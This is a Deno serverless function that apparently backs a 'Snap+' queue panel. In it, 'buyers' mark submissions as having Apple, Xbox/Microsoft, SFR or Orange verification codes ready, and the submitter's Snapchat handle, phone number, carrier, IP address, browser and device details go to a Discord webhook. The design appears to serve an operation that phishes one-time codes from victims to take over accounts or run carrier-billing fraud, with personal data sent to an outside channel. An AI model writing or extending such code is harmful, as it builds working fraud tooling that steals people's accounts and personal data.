import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");

const actionMeta = {
  code_ready: { label: "📤 Code à 4 chiffres (APPLE)", color: 0xFFD700, status: "code_ready" },
  code6: { label: "🔢 Code 6 chiffres (XBOX MICROSOFT)", color: 0x9B59B6, status: "code6_ready" },
  code6sfr: { label: "🔢 Code 6 chiffres (SFR FORMAT)", color: 0xE74C3C, status: "code6sfr_ready" },
  code6orange: { label: "🔢 Code 6 chiffres (ORANGE FORMAT)", color: 0xFF6600, status: "code6orange_ready" },
  wrong: { label: "❌ Mauvais numéro", color: 0xE74C3C, status: "code_wrong" },
  wait: { label: "⏳ Mis en file d'attente", color: 0x3498DB, status: "waiting_queue" },
  valid: { label: "✅ Code validé", color: 0x2ECC71, status: "code_valid" },
  expired: { label: "⏰ Code expiré", color: 0xF39C12, status: "code_expired" },
  blacklist: { label: "🚫 Blacklist", color: 0xE74C3C, status: "blacklisted" },
};

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { queueSubmissionId, action, buyerId, buyerName } = await req.json();

    if (!queueSubmissionId || !action) {
      return Response.json({ error: 'queueSubmissionId et action requis' }, { status: 400 });
    }
    const meta = actionMeta[action];
    if (!meta) return Response.json({ error: 'Action inconnue' }, { status: 400 });

    const sub = await base44.asServiceRole.entities.QueueSubmission.get(queueSubmissionId).catch(() => null);
    if (!sub) return Response.json({ error: 'Soumission introuvable' }, { status: 404 });

    const now = new Date();
    const dateStr = now.toLocaleString("fr-FR", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", timeZone: "Europe/Paris" });

    let queueStatus = sub.status;
    if (action === 'blacklist') {
      // Blacklist IP + telephone, puis annule
      if (sub.ip_address && sub.ip_address !== 'unknown') {
        const ex = await base44.asServiceRole.entities.BlacklistEntry.filter({ value: sub.ip_address, type: 'ip' });
        if (ex.length === 0) await base44.asServiceRole.entities.BlacklistEntry.create({ value: sub.ip_address, type: 'ip' });
      }
      if (sub.telephone) {
        const exP = await base44.asServiceRole.entities.BlacklistEntry.filter({ value: sub.telephone, type: 'phone' });
        if (exP.length === 0) await base44.asServiceRole.entities.BlacklistEntry.create({ value: sub.telephone, type: 'phone' });
      }
      queueStatus = 'cancelled';
    } else if (action === 'valid') {
      queueStatus = 'completed';
    }

    await base44.asServiceRole.entities.QueueSubmission.update(queueSubmissionId, {
      action_status: meta.status,
      status: queueStatus,
      ...(queueStatus === 'completed' ? { completed_date: now.toISOString() } : {}),
    });

    await base44.asServiceRole.entities.QueueLog.create({
      submission_id: queueSubmissionId,
      queue_number: sub.queue_number,
      action,
      actor_id: buyerId || '',
      actor_name: buyerName || 'Buyer',
      actor_role: 'buyer',
      note: meta.label,
      timestamp: now.toISOString(),
    });

    // ---- Notification Discord ----
    const formatPhone = (t) => (t || '').replace(/(\d{2})(?=\d)/g, '$1 ').trim();
    const embed = {
      title: `#${String(sub.queue_number).padStart(3, '0')} — ${meta.label}`,
      color: meta.color,
      fields: [
        { name: "👻 Snapchat", value: sub.snapchat || 'N/A', inline: true },
        { name: "📞 Téléphone", value: formatPhone(sub.telephone), inline: true },
        { name: "📡 Opérateur", value: sub.operateur || 'N/A', inline: true },
        { name: "🌍 Pays", value: sub.country || 'N/A', inline: true },
        { name: "🌐 Navigateur", value: sub.browser || 'N/A', inline: true },
        { name: "💾 Appareil", value: sub.device_type || 'N/A', inline: true },
        { name: "🕵️ IP", value: `\`${sub.ip_address || 'N/A'}\``, inline: true },
        { name: "🛒 Buyer", value: buyerName || 'N/A', inline: true },
        { name: "🕐 Heure", value: dateStr, inline: false },
      ],
      footer: { text: `Queue Panel • Snap+` },
      timestamp: now.toISOString(),
    };
    if (DISCORD_WEBHOOK) {
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      }).catch(() => {});
    }

    return Response.json({ ok: true });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});